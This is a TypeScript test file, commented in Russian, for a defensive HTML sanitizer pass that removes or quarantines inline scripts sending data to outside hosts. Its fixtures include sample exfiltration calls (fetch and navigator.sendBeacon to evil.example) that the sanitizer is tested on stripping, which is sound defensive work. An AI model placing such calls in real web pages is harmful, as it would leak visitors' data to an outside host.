import { describe, it, expect } from 'vitest';
import { parseHtml, serializeHtml } from '../../../utils/html-dom.js';
import type { PassContext } from '../../../types.js';
import { removeInlineExfilPass } from '../remove-inline-exfil-pass.js';

const ctx = (): PassContext => ({
  siteDir: '/s', mainHost: 'mysite.com', filePath: '/s/index.html', relPath: 'index.html', log: [], quarantine: [],
});

function run(html: string, c = ctx()): string {
  const $ = parseHtml(html);
  removeInlineExfilPass($, c);
  return serializeHtml($);
}

describe('removeInlineExfilPass (DOM)', () => {
  it('вырезает fetch на внешний хост, сохраняя остальной JS как сырой текст', () => {
    const html = `<!DOCTYPE html><html><head><script>
var x = 1 < 2 && 3 > 2;
fetch('https://evil.example/steal');
function quiz(){ return x; }
</script></head><body></body></html>`;
    const out = run(html);
    expect(out).not.toContain('evil.example');
    // оператор сравнения НЕ должен экранироваться в &lt;/&gt;
    expect(out).toContain('1 < 2 && 3 > 2');
    expect(out).toContain('function quiz()');
  });

  it('простой инлайн-скрипт (скролл/квиз) остаётся нетронутым', () => {
    const c = ctx();
    const html = `<html><head><script>
document.querySelector('#btn').addEventListener('click', function(){ window.scrollTo(0, 0); });
</script></head><body></body></html>`;
    const out = run(html, c);
    expect(out).toContain('scrollTo(0, 0)');
    expect(out).toContain('addEventListener');
  });

  it('блок, состоящий только из exfil, удаляется целиком', () => {
    const html = `<html><head><script>navigator.sendBeacon('https://evil.example/b', 'x');</script></head><body></body></html>`;
    const out = run(html);
    expect(out).not.toContain('evil.example');
    expect(out).not.toContain('sendBeacon');
  });
});

describe('removeInlineExfilPass — 2D-5: непарсимый inline <script>', () => {
  it('непарсимый + индикаторы exfil → карантин (удалён + залогирован)', () => {
    const c = ctx();
    const out = run(`<html><head><script>fetch( atob(</script></head><body>x</body></html>`, c);
    expect(out).not.toContain('fetch'); // скрипт изолирован, не глотается тишиной
    expect(c.quarantine!.some((q) => q.kind === 'inline-script-unparsed')).toBe(true);
    expect(c.log.some((e) => e.type === 'INLINE_JS_NOT_ANALYZED')).toBe(true);
  });

  it('непарсимый БЕЗ индикаторов (макро-шаблон {{offer}}) → не трогаем, без шума', () => {
    const c = ctx();
    const out = run(`<html><head><script>var x = {{offer}};</script></head><body>x</body></html>`, c);
    expect(out).toContain('{{offer}}'); // benign шаблон сохранён
    expect(c.quarantine!.length).toBe(0);
    expect(c.log.some((e) => e.type === 'INLINE_JS_NOT_ANALYZED')).toBe(false);
  });

  it('не-JS тип (text/template) с похожим контентом НЕ карантинится', () => {
    const c = ctx();
    const out = run(`<html><head><script type="text/template">var t = fetch(</script></head><body>x</body></html>`, c);
    expect(out).toContain('fetch'); // шаблон не исполняется браузером → не наша забота
    expect(c.quarantine!.length).toBe(0);
  });

  it('НЕ-регресс: парсимый безобидный скрипт остаётся', () => {
    const c = ctx();
    const out = run(`<html><head><script>var n = 1; show(n);</script></head><body>x</body></html>`, c);
    expect(out).toContain('show(n)');
    expect(c.quarantine!.length).toBe(0);
    expect(c.log.some((e) => e.type === 'INLINE_JS_NOT_ANALYZED')).toBe(false);
  });
});
